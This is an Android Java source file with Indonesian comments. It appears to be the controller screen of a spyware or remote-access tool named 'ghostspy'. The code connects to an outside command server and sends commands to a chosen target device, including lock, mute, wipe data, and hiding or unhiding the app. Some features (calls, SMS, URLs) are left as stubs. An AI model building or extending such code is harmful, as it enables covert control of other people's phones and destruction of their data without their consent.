package com.testapp;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control);

        deviceId = getIntent().getStringExtra("deviceId");
        TextView title = findViewById(R.id.deviceTitle);
        title.setText("🎯 " + deviceId);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {
            Toast.makeText(this, "Error socket", Toast.LENGTH_SHORT).show();
            return;
        }

        LinearLayout container = findViewById(R.id.controlContainer);

        // Daftar tombol
        addButton(container, "🔦 Flashlight", () -> sendCmd("flashlight"));
        addButton(container, "🔒 Lock Device", () -> sendCmd("lock"));
        addButton(container, "🔇 Mute Volume", () -> sendCmd("mute"));
        addButton(container, "📳 Vibrate", () -> sendCmd("vibrate"));
        addButton(container, "🖼️ Change Wallpaper", () -> {
            // Butuh input URL, pakai Toast dulu, nanti bisa diganti dialog
            Toast.makeText(this, "Fitur ini butuh input, nanti ditambah", Toast.LENGTH_SHORT).show();
        });
        addButton(container, "📞 Call", () -> {
            Toast.makeText(this, "Masukkan nomor nanti", Toast.LENGTH_SHORT).show();
        });
        addButton(container, "💬 Send SMS", () -> {
            Toast.makeText(this, "SMS butuh nomor & pesan", Toast.LENGTH_SHORT).show();
        });
        addButton(container, "📢 Toast", () -> {
            Toast.makeText(this, "Masukkan teks toast", Toast.LENGTH_SHORT).show();
        });
        addButton(container, "🔊 Speak", () -> {
            Toast.makeText(this, "Masukkan teks suara", Toast.LENGTH_SHORT).show();
        });
        addButton(container, "🌐 Open URL", () -> {
            Toast.makeText(this, "Masukkan URL", Toast.LENGTH_SHORT).show();
        });
        addButton(container, "💣 Wipe Data", () -> sendCmd("wipe"));
        addButton(container, "👻 Hide App", () -> sendCmd("hide_app"));
        addButton(container, "👁️ Unhide App", () -> sendCmd("unhide_app"));
        // Tambahkan tombol lainnya sesuai kebutuhan
    }

    private void addButton(LinearLayout container, String text, Runnable action) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(0xFFFFFFFF);
        btn.setBackgroundColor(0xFF222222);
        btn.setOnClickListener(v -> action.run());
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        params.setMargins(0, 0, 0, 12);
        btn.setLayoutParams(params);
        container.addView(btn);
    }

    private void sendCmd(String cmd) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", new JSONObject());
                socket.emit("command", msg);
                Toast.makeText(this, "Perintah " + cmd + " dikirim", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(this, "Socket tidak terhubung", Toast.LENGTH_SHORT).show();
        }
    }
}
